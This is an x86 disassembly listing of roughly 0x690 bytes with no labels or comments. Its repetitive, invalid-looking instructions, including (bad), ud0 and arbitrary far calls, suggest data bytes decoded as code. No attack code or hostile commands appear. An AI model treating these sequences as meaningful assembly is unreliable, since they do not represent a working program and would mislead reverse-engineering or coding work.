  442b85:	scas   eax,DWORD PTR es:[edi]
  442b86:	dec    DWORD PTR [ebx]
  442b88:	pop    ss
  442b89:	retf   0x17ff
  442b8c:	and    ah,BYTE PTR [ebp-0x7ddfe301]
  442b92:	dec    DWORD PTR [edx+ecx*1]
  442b95:	scas   eax,DWORD PTR es:[edi]
  442b96:	inc    DWORD PTR [eax]
  442b98:	add    al,ch
  442b9a:	inc    DWORD PTR [eax]
  442b9c:	add    ch,dl
  442b9e:	inc    DWORD PTR [eax]
  442ba0:	add    bl,al
  442ba2:	inc    DWORD PTR [eax]
  442ba4:	add    BYTE PTR [edi-0x1],bh
  442ba7:	add    BYTE PTR [eax],al
  442ba9:	dec    esi
  442baa:	inc    DWORD PTR [eax]
  442bac:	add    BYTE PTR ds:0x160000ff,ch
  442bb2:	inc    DWORD PTR [eax]
  442bb4:	add    BYTE PTR [edi+edi*8],cl
  442bb7:	add    BYTE PTR [eax],al
  442bb9:	or     al,0xff
  442bbb:	add    BYTE PTR [eax],al
  442bbd:	or     edi,edi
  442bbf:	add    BYTE PTR [eax],al
  442bc1:	or     edi,edi
  442bc3:	add    BYTE PTR [eax],al
  442bc5:	or     eax,0xe0000ff
  442bca:	inc    DWORD PTR [eax]
  442bcc:	add    BYTE PTR ds:0xb0000ff,cl
  442bd2:	inc    DWORD PTR [eax]
  442bd4:	add    BYTE PTR [ebx],cl
  442bd6:	inc    DWORD PTR [eax]
  442bd8:	add    BYTE PTR [edx],cl
  442bda:	inc    DWORD PTR [eax]
  442bdc:	add    BYTE PTR [edi+edi*8],cl
  442bdf:	add    BYTE PTR [eax],al
  442be1:	or     edi,edi
  442be3:	add    BYTE PTR [eax],al
  442be5:	push   cs
  442be6:	inc    DWORD PTR [eax]
  442be8:	add    BYTE PTR [eax],dl
  442bea:	inc    DWORD PTR [eax]
  442bec:	add    BYTE PTR [esi],cl
  442bee:	inc    DWORD PTR [eax]
  442bf0:	add    BYTE PTR [edi+edi*8],cl
  442bf3:	add    BYTE PTR [eax],al
  442bf5:	or     al,0xff
  442bf7:	add    BYTE PTR [eax],al
  442bf9:	adc    bh,bh
  442bfb:	add    BYTE PTR [eax],al
  442bfd:	ud0    eax,DWORD PTR [eax]
  442c00:	add    BYTE PTR ds:0xa0000ff,cl
  442c06:	inc    DWORD PTR [eax]
  442c08:	add    BYTE PTR [edx],cl
  442c0a:	inc    DWORD PTR [eax]
  442c0c:	add    BYTE PTR [edi],cl
  442c0e:	inc    DWORD PTR [eax]
  442c10:	add    BYTE PTR [edi+edi*8],dl
  442c13:	add    BYTE PTR [eax],al
  442c15:	sbb    bh,bh
  442c17:	add    BYTE PTR [eax],al
  442c19:	and    bh,bh
  442c1b:	add    BYTE PTR [eax],al
  442c1d:	and    edi,edi
  442c1f:	add    BYTE PTR [eax],al
  442c21:	and    edi,edi
  442c23:	add    BYTE PTR [eax],al
  442c25:	and    al,0xff
  442c27:	add    BYTE PTR [eax],al
  442c29:	sbb    eax,0x180000ff
  442c2e:	inc    DWORD PTR [eax]
  442c30:	add    BYTE PTR [eax],bl
  442c32:	inc    DWORD PTR [eax]
  442c34:	add    BYTE PTR ds:0x120000ff,dl
  442c3a:	inc    DWORD PTR [eax]
  442c3c:	add    BYTE PTR [ecx],dl
  442c3e:	inc    DWORD PTR [eax]
  442c40:	add    BYTE PTR [edx],dl
  442c42:	inc    DWORD PTR [eax]
  442c44:	add    BYTE PTR [ecx],dl
  442c46:	inc    DWORD PTR [eax]
  442c48:	add    BYTE PTR [eax],dl
  442c4a:	inc    DWORD PTR [eax]
  442c4c:	add    BYTE PTR [edx],dl
  442c4e:	inc    DWORD PTR [eax]
  442c50:	add    BYTE PTR [ecx],dl
  442c52:	inc    DWORD PTR [eax]
  442c54:	add    BYTE PTR [eax],dl
  442c56:	inc    DWORD PTR [eax]
  442c58:	add    BYTE PTR [edi+edi*8],cl
  442c5b:	add    BYTE PTR [eax],al
  442c5d:	ud0    eax,DWORD PTR [eax]
  442c60:	add    BYTE PTR [edi],cl
  442c62:	inc    DWORD PTR [eax]
  442c64:	add    BYTE PTR [ecx],dl
  442c66:	inc    DWORD PTR [eax]
  442c68:	add    BYTE PTR [ebx],bl
  442c6a:	inc    DWORD PTR [eax]
  442c6c:	add    BYTE PTR [eax],bh
  442c6e:	inc    DWORD PTR [eax]
  442c70:	add    BYTE PTR [edi-0x1],ah
  442c73:	add    BYTE PTR [edx],al
  442c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442c76:	inc    DWORD PTR ds:0x1fffdf22
  442c7c:	sub    al,0x5f
  442c7e:	push   DWORD PTR [ebx]
  442c80:	and    DWORD PTR [edi],ebp
  442c82:	jmp    FWORD PTR [eax]
  442c84:	and    al,BYTE PTR [eax-0x1]
  442c87:	push   ss
  442c88:	pop    ss
  442c89:	inc    DWORD PTR ds:[esi]
  442c8c:	adc    eax,0x1e15ff3f
  442c91:	cmp    bh,bh
  442c93:	nop    DWORD PTR [ebx-0x1]
  442c97:	or     esp,DWORD PTR [ecx]
  442c99:	outs   dx,BYTE PTR ds:[esi]
  442c9a:	inc    DWORD PTR [edi]
  442c9c:	pop    ss
  442c9d:	dec    eax
  442c9e:	inc    DWORD PTR [ecx+edx*1]
  442ca1:	inc    eax
  442ca2:	dec    DWORD PTR [eax]
  442ca4:	or     bh,BYTE PTR [ecx]
  442ca6:	dec    DWORD PTR ds:0x16ff3507
  442cac:	push   edx
  442cad:	in     eax,dx
  442cae:	inc    DWORD PTR [eax]
  442cb0:	or     al,0xdd
  442cb2:	inc    DWORD PTR [eax]
  442cb4:	add    BYTE PTR [ecx+0x600000ff],bl
  442cba:	inc    DWORD PTR [eax]
  442cbc:	add    BYTE PTR [esi],dh
  442cbe:	inc    DWORD PTR [eax]
  442cc0:	add    BYTE PTR [esi],dl
  442cc2:	inc    DWORD PTR [eax]
  442cc4:	add    BYTE PTR [ebx],cl
  442cc6:	inc    DWORD PTR [eax]
  442cc8:	add    BYTE PTR [ebx],cl
  442cca:	inc    DWORD PTR [eax]
  442ccc:	add    BYTE PTR [edi+edi*8],cl
  442ccf:	add    BYTE PTR [eax],al
  442cd1:	or     al,0xff
  442cd3:	add    BYTE PTR [eax],al
  442cd5:	or     bh,bh
  442cd7:	add    BYTE PTR [eax],al
  442cd9:	ud0    eax,DWORD PTR [eax]
  442cdc:	add    BYTE PTR ds:0x1e0000ff,dl
  442ce2:	inc    DWORD PTR [eax]
  442ce4:	add    BYTE PTR [edx],ch
  442ce6:	inc    DWORD PTR [eax]
  442ce8:	add    BYTE PTR [ebx-0x1],al
  442ceb:	add    BYTE PTR [eax],al
  442ced:	popa   
  442cee:	inc    DWORD PTR [eax]
  442cf0:	add    BYTE PTR [ebp-0x60f7fd01],cl
  442cf6:	inc    DWORD PTR [esi]
  442cf8:	sbb    ebx,eax
  442cfa:	call   FWORD PTR [edx]
  442cfc:	push   ds
  442cfd:	push   eax
  442cfe:	dec    DWORD PTR [edx]
  442d00:	or     esi,DWORD PTR [edx]
  442d02:	call   DWORD PTR [ecx]
  442d04:	mov    edi,tr7
  442d07:	sbb    eax,0x21ff451d
  442d0c:	and    DWORD PTR [edi+edi*8+0x1d],ecx
  442d10:	and    BYTE PTR ds:0x381414ff,dh
  442d16:	call   DWORD PTR ds:0x11ff3513
  442d1c:	adc    DWORD PTR [edi+edi*8],esp
  442d1f:	sbb    DWORD PTR [esi],ecx
  442d21:	adc    eax,0x11081aff
  442d26:	inc    DWORD PTR [esi+eiz*2]
  442d29:	idiv   bh
  442d2b:	add    BYTE PTR [edi],dl
  442d2d:	(bad)  
  442d2f:	add    BYTE PTR [eax],al
  442d31:	inc    WORD PTR [eax]
  442d34:	add    BYTE PTR [ebx],bh
  442d36:	inc    DWORD PTR [eax]
  442d38:	add    BYTE PTR [ebx],bl
  442d3a:	inc    DWORD PTR [eax]
  442d3c:	add    BYTE PTR [edi+edi*8],cl
  442d3f:	add    BYTE PTR [eax],al
  442d41:	or     bh,bh
  442d43:	add    BYTE PTR [eax],al
  442d45:	push   es
  442d46:	inc    DWORD PTR [eax]
  442d48:	add    BYTE PTR [esi],al
  442d4a:	inc    DWORD PTR [eax]
  442d4c:	add    BYTE PTR [edi+edi*8],cl
  442d4f:	add    BYTE PTR [eax],al
  442d51:	sbb    eax,0x430000ff
  442d56:	inc    DWORD PTR [eax]
  442d58:	add    BYTE PTR [edx-0x1],dh
  442d5b:	add    DWORD PTR ds:0x1718ffd8,eax
  442d61:	sahf   
  442d62:	call   DWORD PTR ds:0x2ff1e13
  442d68:	add    dl,BYTE PTR [edi+edi*8]
  442d6b:	adc    edx,DWORD PTR [edx]
  442d6d:	cmp    bh,bh
  442d6f:	movlps xmm0,QWORD PTR [eax-0x1]
  442d73:	push   cs
  442d74:	adc    DWORD PTR [edi+edi*8],edi
  442d77:	adc    ebx,DWORD PTR [ebx]
  442d79:	push   edi
  442d7a:	inc    DWORD PTR [eax]
  442d7c:	add    BYTE PTR [edx-0x1],al
  442d7f:	movhps xmm6,QWORD PTR [ebp-0x1]
  442d83:	sbb    esp,DWORD PTR [esi]
  442d85:	mov    al,ds:0x4f241dff
  442d8a:	call   FWORD PTR ds:0x1fff2519
  442d90:	sbb    BYTE PTR [ebx],dh
  442d92:	jmp    FWORD PTR [edx]
  442d94:	and    al,0x2b
  442d96:	jmp    DWORD PTR [eax]
  442d98:	sbb    eax,0x606ff68
  442d9d:	int3   
  442d9e:	inc    DWORD PTR [eax]
  442da0:	add    cl,ah
  442da2:	inc    DWORD PTR [ecx]
  442da4:	add    DWORD PTR [ecx+0x570000ff],ebp
  442daa:	inc    DWORD PTR [eax]
  442dac:	add    BYTE PTR ds:0x1d0000ff,dh
  442db2:	inc    DWORD PTR [eax]
  442db4:	add    BYTE PTR [edx],dl
  442db6:	inc    DWORD PTR [eax]
  442db8:	add    BYTE PTR [edi],cl
  442dba:	inc    DWORD PTR [eax]
  442dbc:	add    BYTE PTR [ebx],cl
  442dbe:	inc    DWORD PTR [eax]
  442dc0:	add    BYTE PTR [ecx],cl
  442dc2:	inc    DWORD PTR [eax]
  442dc4:	add    BYTE PTR [ebx],cl
  442dc6:	inc    DWORD PTR [eax]
  442dc8:	add    BYTE PTR [esi],cl
  442dca:	inc    DWORD PTR [eax]
  442dcc:	add    BYTE PTR [eax],dl
  442dce:	inc    DWORD PTR [eax]
  442dd0:	add    BYTE PTR [eax],dl
  442dd2:	inc    DWORD PTR [eax]
  442dd4:	add    BYTE PTR [eax],dl
  442dd6:	inc    DWORD PTR [eax]
  442dd8:	add    BYTE PTR [esi],cl
  442dda:	inc    DWORD PTR [eax]
  442ddc:	add    BYTE PTR [esi],cl
  442dde:	inc    DWORD PTR [eax]
  442de0:	add    BYTE PTR [edx],cl
  442de2:	inc    DWORD PTR [eax]
  442de4:	add    BYTE PTR [edi],cl
  442de6:	inc    DWORD PTR [eax]
  442de8:	add    BYTE PTR [edi],cl
  442dea:	inc    DWORD PTR [eax]
  442dec:	add    BYTE PTR [ecx],cl
  442dee:	inc    DWORD PTR [eax]
  442df0:	add    BYTE PTR [edi],cl
  442df2:	inc    DWORD PTR [eax]
  442df4:	add    BYTE PTR [edi],cl
  442df6:	inc    DWORD PTR [eax]
  442df8:	add    BYTE PTR [esi],cl
  442dfa:	inc    DWORD PTR [eax]
  442dfc:	add    BYTE PTR [ebx],cl
  442dfe:	inc    DWORD PTR [eax]
  442e00:	add    BYTE PTR [esi],cl
  442e02:	inc    DWORD PTR [eax]
  442e04:	add    BYTE PTR [ebx],cl
  442e06:	inc    DWORD PTR [eax]
  442e08:	add    BYTE PTR [edi+edi*8],cl
  442e0b:	add    BYTE PTR [eax],al
  442e0d:	adc    al,0xff
  442e0f:	add    BYTE PTR [eax],al
  442e11:	sbb    edi,edi
  442e13:	add    BYTE PTR [eax],al
  442e15:	and    eax,0x2d0000ff
  442e1a:	inc    DWORD PTR [eax]
  442e1c:	add    BYTE PTR ds:0x380000ff,dh
  442e22:	inc    DWORD PTR [eax]
  442e24:	add    BYTE PTR [edi],dh
  442e26:	inc    DWORD PTR [eax]
  442e28:	add    BYTE PTR [esi],ch
  442e2a:	inc    DWORD PTR [eax]
  442e2c:	add    BYTE PTR [ebx],ah
  442e2e:	inc    DWORD PTR [eax]
  442e30:	add    BYTE PTR [ebx],bl
  442e32:	inc    DWORD PTR [eax]
  442e34:	add    BYTE PTR [esi],dl
  442e36:	inc    DWORD PTR [eax]
  442e38:	add    BYTE PTR [edi],cl
  442e3a:	inc    DWORD PTR [eax]
  442e3c:	add    BYTE PTR [edx],dl
  442e3e:	inc    DWORD PTR [eax]
  442e40:	add    BYTE PTR [esi],cl
  442e42:	inc    DWORD PTR [eax]
  442e44:	add    BYTE PTR [edi],cl
  442e46:	inc    DWORD PTR [eax]
  442e48:	add    BYTE PTR [edi+edi*8],cl
  442e4b:	add    BYTE PTR [eax],al
  442e4d:	or     al,0xff
  442e4f:	add    BYTE PTR [eax],al
  442e51:	push   cs
  442e52:	inc    DWORD PTR [eax]
  442e54:	add    BYTE PTR [edi],cl
  442e56:	inc    DWORD PTR [eax]
  442e58:	add    BYTE PTR [edi],cl
  442e5a:	inc    DWORD PTR [eax]
  442e5c:	add    BYTE PTR [edi],cl
  442e5e:	inc    DWORD PTR [eax]
  442e60:	add    BYTE PTR [eax],dl
  442e62:	inc    DWORD PTR [eax]
  442e64:	add    BYTE PTR [edi],cl
  442e66:	inc    DWORD PTR [eax]
  442e68:	add    BYTE PTR [edi+edi*8],bl
  442e6b:	add    BYTE PTR [eax],al
  442e6d:	cmp    al,0xff
  442e6f:	add    BYTE PTR [eax],al
  442e71:	inc    DWORD PTR gs:[ecx]
  442e74:	add    ebx,DWORD PTR [edi+edi*8-0x83d6e7]
  442e7b:	pop    es
  442e7c:	or     BYTE PTR [eax],ch
  442e7e:	push   DWORD PTR [ebx]
  442e80:	and    al,0x3b
  442e82:	jmp    FWORD PTR [ebx]
  442e84:	and    eax,DWORD PTR [edx-0x1]
  442e87:	and    BYTE PTR [ebx],bl
  442e89:	cmp    al,0xff
  442e8b:	add    ecx,DWORD PTR [edx]
  442e8d:	push   eax
  442e8e:	dec    DWORD PTR [edi]
  442e90:	sbb    BYTE PTR [ecx-0x1],cl
  442e93:	and    BYTE PTR [esi],ah
  442e95:	inc    DWORD PTR ss:0xff7f10
  442e9c:	add    DWORD PTR [esi],ebp
  442e9e:	inc    DWORD PTR [edi]
  442ea0:	push   ss
  442ea1:	cmp    eax,0x410d0fff
  442ea6:	dec    DWORD PTR [edx]
  442ea8:	or     BYTE PTR [edx],bh
  442eaa:	call   FWORD PTR [eax+eiz*2]
  442ead:	icebp  
  442eae:	inc    DWORD PTR [esi+edx*1]
  442eb1:	fdivr  st,st(7)
  442eb3:	add    BYTE PTR [ecx],al
  442eb5:	cdq    
  442eb6:	inc    DWORD PTR [eax]
  442eb8:	add    BYTE PTR [edi+edi*8+0x0],bl
  442ebc:	add    BYTE PTR [eax],dh
  442ebe:	inc    DWORD PTR [eax]
  442ec0:	add    BYTE PTR [edi],dl
  442ec2:	inc    DWORD PTR [eax]
  442ec4:	add    BYTE PTR ds:0x90000ff,cl
  442eca:	inc    DWORD PTR [eax]
  442ecc:	add    BYTE PTR [ebx],cl
  442ece:	inc    DWORD PTR [eax]
  442ed0:	add    BYTE PTR [edx],cl
  442ed2:	inc    DWORD PTR [eax]
  442ed4:	add    BYTE PTR [edi],dl
  442ed6:	inc    DWORD PTR [eax]
  442ed8:	add    BYTE PTR [edi],dl
  442eda:	inc    DWORD PTR [eax]
  442edc:	add    BYTE PTR [edx],ah
  442ede:	inc    DWORD PTR [eax]
  442ee0:	add    BYTE PTR ds:0x4b0000ff,dh
  442ee6:	inc    DWORD PTR [eax]
  442ee8:	add    BYTE PTR [edx-0x1],ah
  442eeb:	add    BYTE PTR [eax],al
  442eed:	cmp    bh,0x0
  442ef0:	add    BYTE PTR [ebx-0x3fffff01],ah
  442ef6:	inc    DWORD PTR [eax]
  442ef8:	or     ebx,ecx
  442efa:	call   FWORD PTR [edx]
  442efc:	sbb    esi,DWORD PTR [eax]
  442efe:	dec    DWORD PTR [edx]
  442f00:	or     BYTE PTR ds:0x380e10ff,ah
  442f06:	call   FWORD PTR ds:0x17ff4523
  442f0c:	sbb    eax,DWORD PTR [ebp-0x1]
  442f0f:	push   cs
  442f10:	or     al,0x26
  442f12:	call   DWORD PTR [eax]
  442f14:	or     eax,0x1618ff30
  442f19:	xor    eax,0x381410ff
  442f1e:	call   FWORD PTR [eax]
  442f20:	or     DWORD PTR [esi],edx
  442f22:	call   FWORD PTR [eax]
  442f24:	adc    DWORD PTR ds:0xfe5205ff,esp
  442f2a:	inc    DWORD PTR [eax]
  442f2c:	add    al,0xc8
  442f2e:	inc    DWORD PTR [eax]
  442f30:	add    BYTE PTR [edi+edi*8+0x0],ah
  442f34:	add    BYTE PTR [eax],bh
  442f36:	inc    DWORD PTR [eax]
  442f38:	add    BYTE PTR [ebx],bl
  442f3a:	inc    DWORD PTR [eax]
  442f3c:	add    BYTE PTR [edx],cl
  442f3e:	inc    DWORD PTR [eax]
  442f40:	add    BYTE PTR [esi],al
  442f42:	inc    DWORD PTR [eax]
  442f44:	add    BYTE PTR [esi],al
  442f46:	inc    DWORD PTR [eax]
  442f48:	add    BYTE PTR [eax],cl
  442f4a:	inc    DWORD PTR [eax]
  442f4c:	add    BYTE PTR [edx],cl
  442f4e:	inc    DWORD PTR [eax]
  442f50:	add    BYTE PTR [edi+edi*8],bl
  442f53:	add    BYTE PTR [eax],al
  442f55:	cmp    eax,0x6c0000ff
  442f5a:	inc    DWORD PTR [edx]
  442f5c:	add    eax,0x140fffc8
  442f61:	mov    al,ds:0x2d0d0cff
  442f66:	dec    DWORD PTR [eax]
  442f68:	or     al,0x40
  442f6a:	call   DWORD PTR [edx+edx*1]
  442f6d:	cmp    edi,edi
  442f6f:	(bad)  
  442f70:	wrmsr  
  442f72:	inc    DWORD PTR [esi+eax*1]
  442f75:	sub    edi,edi
  442f77:	adc    al,0x1a
  442f79:	dec    DWORD PTR fs:[eax+edx*1]
  442f7d:	imul   edi,edi,0xffaf1d11
  442f83:	adc    BYTE PTR [edx],bl
  442f85:	(bad)  
  442f88:	and    DWORD PTR [esi+0x2e0b07ff],ebx
  442f8e:	inc    DWORD PTR [eax]
  442f90:	add    BYTE PTR [edi],ah
  442f92:	call   DWORD PTR [ebx]
  442f94:	adc    ah,BYTE PTR [ecx]
  442f96:	jmp    DWORD PTR [edi]
  442f98:	sub    ebp,DWORD PTR [edi+edi*8]
  442f9b:	sub    DWORD PTR [ebx],esp
  442f9d:	push   ebx
  442f9e:	inc    DWORD PTR [ecx]
  442fa0:	add    eax,esp
  442fa2:	inc    DWORD PTR [eax]
  442fa4:	add    BYTE PTR [esi+0x690000ff],bl
  442faa:	inc    DWORD PTR [eax]
  442fac:	add    BYTE PTR [ebp-0x1],al
  442faf:	add    BYTE PTR [eax],al
  442fb1:	sub    bh,bh
  442fb3:	add    BYTE PTR [eax],al
  442fb5:	sbb    edi,edi
  442fb7:	add    BYTE PTR [eax],al
  442fb9:	adc    edi,edi
  442fbb:	add    BYTE PTR [eax],al
  442fbd:	ud0    eax,DWORD PTR [eax]
  442fc0:	add    BYTE PTR [ecx],cl
  442fc2:	inc    DWORD PTR [eax]
  442fc4:	add    BYTE PTR [eax],cl
  442fc6:	inc    DWORD PTR [eax]
  442fc8:	add    BYTE PTR [edx],cl
  442fca:	inc    DWORD PTR [eax]
  442fcc:	add    BYTE PTR [edi+edi*8],cl
  442fcf:	add    BYTE PTR [eax],al
  442fd1:	or     edi,edi
  442fd3:	add    BYTE PTR [eax],al
  442fd5:	or     edi,edi
  442fd7:	add    BYTE PTR [eax],al
  442fd9:	push   cs
  442fda:	inc    DWORD PTR [eax]
  442fdc:	add    BYTE PTR ds:0xa0000ff,cl
  442fe2:	inc    DWORD PTR [eax]
  442fe4:	add    BYTE PTR [edi],al
  442fe6:	inc    DWORD PTR [eax]
  442fe8:	add    BYTE PTR [edi],cl
  442fea:	inc    DWORD PTR [eax]
  442fec:	add    BYTE PTR [ebx],cl
  442fee:	inc    DWORD PTR [eax]
  442ff0:	add    BYTE PTR [esi],cl
  442ff2:	inc    DWORD PTR [eax]
  442ff4:	add    BYTE PTR [edi+edi*8],cl
  442ff7:	add    BYTE PTR [eax],al
  442ff9:	push   cs
  442ffa:	inc    DWORD PTR [eax]
  442ffc:	add    BYTE PTR [edi+edi*8],cl
  442fff:	add    BYTE PTR [eax],al
  443001:	or     edi,edi
  443003:	add    BYTE PTR [eax],al
  443005:	push   cs
  443006:	inc    DWORD PTR [eax]
  443008:	add    BYTE PTR [edi+edi*8],dl
  44300b:	add    BYTE PTR [eax],al
  44300d:	sbb    bh,bh
  44300f:	add    BYTE PTR [eax],al
  443011:	sub    bh,bh
  443013:	add    BYTE PTR [eax],al
  443015:	cmp    edi,edi
  443017:	add    BYTE PTR [eax],al
  443019:	dec    ebx
  44301a:	inc    DWORD PTR [eax]
  44301c:	add    BYTE PTR [eax-0x1],bl
  44301f:	add    BYTE PTR [ecx],al
  443021:	arpl   di,di
  443023:	add    BYTE PTR [ebx+ebp*2],al
  443026:	inc    DWORD PTR [eax]
  443028:	add    BYTE PTR [ecx-0x1],al
  44302b:	add    BYTE PTR [eax],al
  44302d:	sub    al,0xff
  44302f:	add    BYTE PTR [eax],al
  443031:	sbb    eax,0x120000ff
  443036:	inc    DWORD PTR [eax]
  443038:	add    BYTE PTR [eax],dl
  44303a:	inc    DWORD PTR [eax]
  44303c:	add    BYTE PTR [edi+edi*8],cl
  44303f:	add    BYTE PTR [eax],al
  443041:	push   cs
  443042:	inc    DWORD PTR [eax]
  443044:	add    BYTE PTR [eax],dl
  443046:	inc    DWORD PTR [eax]
  443048:	add    BYTE PTR [esi],cl
  44304a:	inc    DWORD PTR [eax]
  44304c:	add    BYTE PTR [eax],dl
  44304e:	inc    DWORD PTR [eax]
  443050:	add    BYTE PTR [edi],cl
  443052:	inc    DWORD PTR [eax]
  443054:	add    BYTE PTR [edi],cl
  443056:	inc    DWORD PTR [eax]
  443058:	add    BYTE PTR ds:0x100000ff,cl
  44305e:	inc    DWORD PTR [eax]
  443060:	add    BYTE PTR [esi],cl
  443062:	inc    DWORD PTR [eax]
  443064:	add    BYTE PTR [esi],cl
  443066:	inc    DWORD PTR [eax]
  443068:	add    BYTE PTR [edi+edi*8],bl
  44306b:	add    BYTE PTR [eax],al
  44306d:	cmp    al,0xff
  44306f:	add    BYTE PTR [eax],al
  443071:	inc    DWORD PTR gs:[eax]
  443074:	add    BYTE PTR [edi-0x35f0ef01],ah
  44307a:	jmp    DWORD PTR [eax+ebx*1]
  44307d:	add    bh,bh
  44307f:	cs and al,0x44
  443082:	jmp    FWORD PTR [eax]
  443084:	and    cl,BYTE PTR [ecx-0x1]
  443087:	daa    
  443088:	and    al,0x44
  44308a:	call   DWORD PTR ds:0x8ff4113
  443090:	or     eax,0x221eff46
  443095:	aaa    
  443096:	inc    DWORD PTR [ebx]
  443098:	add    DWORD PTR [esi],ebp
  44309a:	inc    DWORD PTR [ecx]
  44309c:	add    BYTE PTR [eax-0x1],al
  44309f:	sbb    ebx,DWORD PTR ds:0xd0dff39
  4430a5:	cmp    edi,edi
  4430a7:	or     al,0x7
  4430a9:	cmp    edi,edi
  4430ab:	sbb    al,0x6c
  4430ad:	(bad)  
  4430ae:	inc    DWORD PTR [eax]
  4430b0:	or     bl,dl
  4430b2:	inc    DWORD PTR [eax]
  4430b4:	add    BYTE PTR [ecx+0x580000ff],dl
  4430ba:	inc    DWORD PTR [eax]
  4430bc:	add    BYTE PTR [esi],ch
  4430be:	inc    DWORD PTR [eax]
  4430c0:	add    BYTE PTR [edi],dl
  4430c2:	inc    DWORD PTR [eax]
  4430c4:	add    BYTE PTR [ebx],cl
  4430c6:	inc    DWORD PTR [eax]
  4430c8:	add    BYTE PTR [esi],cl
  4430ca:	inc    DWORD PTR [eax]
  4430cc:	add    BYTE PTR [edi+edi*8],cl
  4430cf:	add    BYTE PTR [eax],al
  4430d1:	adc    edi,edi
  4430d3:	add    BYTE PTR [eax],al
  4430d5:	pop    ds
  4430d6:	inc    DWORD PTR [eax]
  4430d8:	add    BYTE PTR [eax],ch
  4430da:	inc    DWORD PTR [eax]
  4430dc:	add    BYTE PTR [esi],bh
  4430de:	inc    DWORD PTR [eax]
  4430e0:	add    BYTE PTR [ecx-0x1],bl
  4430e3:	add    BYTE PTR [eax],al
  4430e5:	jae    0x4430e6
  4430e7:	add    BYTE PTR [eax],al
  4430e9:	xchg   bh,bh
  4430eb:	add    BYTE PTR [ecx],al
  4430ed:	sahf   
  4430ee:	inc    DWORD PTR [ecx]
  4430f0:	or     al,0xd3
  4430f2:	inc    DWORD PTR [ebx]
  4430f4:	push   es
  4430f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4430f6:	inc    DWORD PTR [eax]
  4430f8:	add    bl,al
  4430fa:	dec    DWORD PTR [edx]
  4430fc:	(bad)  
  4430fe:	call   FWORD PTR [ebx]
  443100:	sbb    al,0x2e
  443102:	call   FWORD PTR [ebx]
  443104:	and    DWORD PTR [esi-0x1],ecx
  443107:	sbb    BYTE PTR [edx],bl
  443109:	call   FWORD PTR ds:[ebx*1+0xf13ff41]
  443111:	xor    edi,edi
  443113:	adc    edx,DWORD PTR [ecx]
  443115:	sub    eax,0x2a1411ff
  44311a:	call   DWORD PTR [ecx]
  44311c:	rdpmc  
  44311e:	call   FWORD PTR [edi+eax*1]
  443121:	or     edi,edi
  443123:	sbb    BYTE PTR ds:0x4407ff99,dh
  443129:	std    
  44312a:	inc    DWORD PTR [eax]
  44312c:	add    DWORD PTR [ebp+0x5d0000ff],ebx
  443132:	inc    DWORD PTR [eax]
  443134:	add    BYTE PTR [edi+edi*8],dh
  443137:	add    BYTE PTR [eax],al
  443139:	push   ss
  44313a:	inc    DWORD PTR [eax]
  44313c:	add    BYTE PTR [edx],cl
  44313e:	inc    DWORD PTR [eax]
  443140:	add    BYTE PTR [edi],al
  443142:	inc    DWORD PTR [eax]
  443144:	add    BYTE PTR [esi],al
  443146:	inc    DWORD PTR [eax]
  443148:	add    BYTE PTR [esi],al
  44314a:	inc    DWORD PTR [eax]
  44314c:	add    BYTE PTR [eax],cl
  44314e:	inc    DWORD PTR [eax]
  443150:	add    BYTE PTR [eax],bl
  443152:	inc    DWORD PTR [eax]
  443154:	add    BYTE PTR [esi],dh
  443156:	inc    DWORD PTR [eax]
  443158:	add    BYTE PTR [ebx-0x1],ah
  44315b:	add    DWORD PTR [edx],eax
  44315d:	test   al,0xff
  44315f:	adc    edx,DWORD PTR [ebx]
  443161:	mov    edi,edi
  443163:	adc    DWORD PTR [ebx],edx
  443165:	push   esi
  443166:	call   FWORD PTR [eax]
  443168:	sbb    ebx,DWORD PTR [ebx-0x1]
  44316b:	sbb    DWORD PTR [ebx],ebx
  44316d:	pop    eax
  44316e:	call   FWORD PTR [eax]
  443170:	sbb    ah,BYTE PTR [edx-0x1]
  443173:	or     cl,BYTE PTR ds:0xf0cff51
  443179:	dec    eax
  44317a:	dec    DWORD PTR [ecx+edx*1]
  44317d:	push   ecx
  44317e:	call   DWORD PTR [edx+ebx*1]
  443181:	imul   edi,edi,0xf
  443184:	adc    eax,0x1a14ffb8
  443189:	jle    0x44318a
  44318b:	add    BYTE PTR [ecx],al
  44318d:	pop    ss
  44318e:	call   DWORD PTR [esi+edx*1]
  443191:	cmp    al,0xff
  443193:	sbb    bl,BYTE PTR ds:0x201eff3d
  443199:	pop    edx
  44319a:	dec    DWORD PTR [eax]
  44319c:	or     eax,0x200ffc4
  4431a1:	xlat   BYTE PTR ds:[ebx]
  4431a2:	inc    DWORD PTR [eax]
  4431a4:	add    BYTE PTR [edx-0x7dffff01],ch
  4431aa:	inc    DWORD PTR [eax]
  4431ac:	add    BYTE PTR [edi-0x1],bl
  4431af:	add    BYTE PTR [eax],al
  4431b1:	inc    ebp
  4431b2:	inc    DWORD PTR [eax]
  4431b4:	add    BYTE PTR [esi],ch
  4431b6:	inc    DWORD PTR [eax]
  4431b8:	add    BYTE PTR [edi],bl
  4431ba:	inc    DWORD PTR [eax]
  4431bc:	add    BYTE PTR [edi+edi*8],dl
  4431bf:	add    BYTE PTR [eax],al
  4431c1:	or     eax,0xa0000ff
  4431c6:	inc    DWORD PTR [eax]
  4431c8:	add    BYTE PTR [eax],cl
  4431ca:	inc    DWORD PTR [eax]
  4431cc:	add    BYTE PTR [edx],cl
  4431ce:	inc    DWORD PTR [eax]
  4431d0:	add    BYTE PTR [edi+edi*8],cl
  4431d3:	add    BYTE PTR [eax],al
  4431d5:	or     al,0xff
  4431d7:	add    BYTE PTR [eax],al
  4431d9:	or     al,0xff
  4431db:	add    BYTE PTR [eax],al
  4431dd:	or     edi,edi
  4431df:	add    BYTE PTR [eax],al
  4431e1:	or     bh,bh
  4431e3:	add    BYTE PTR [eax],al
  4431e5:	or     bh,bh
  4431e7:	add    BYTE PTR [eax],al
  4431e9:	or     al,0xff
  4431eb:	add    BYTE PTR [eax],al
  4431ed:	or     edi,edi
  4431ef:	add    BYTE PTR [eax],al
  4431f1:	or     edi,edi
  4431f3:	add    BYTE PTR [eax],al
  4431f5:	or     edi,edi
  4431f7:	add    BYTE PTR [eax],al
  4431f9:	or     edi,edi
  4431fb:	add    BYTE PTR [eax],al
  4431fd:	or     eax,0x120000ff
  443202:	inc    DWORD PTR [eax]
  443204:	add    BYTE PTR ds:0x1a0000ff,dl
  44320a:	inc    DWORD PTR [eax]
  44320c:	add    BYTE PTR [ebx],ch
  44320e:	inc    DWORD PTR [eax]
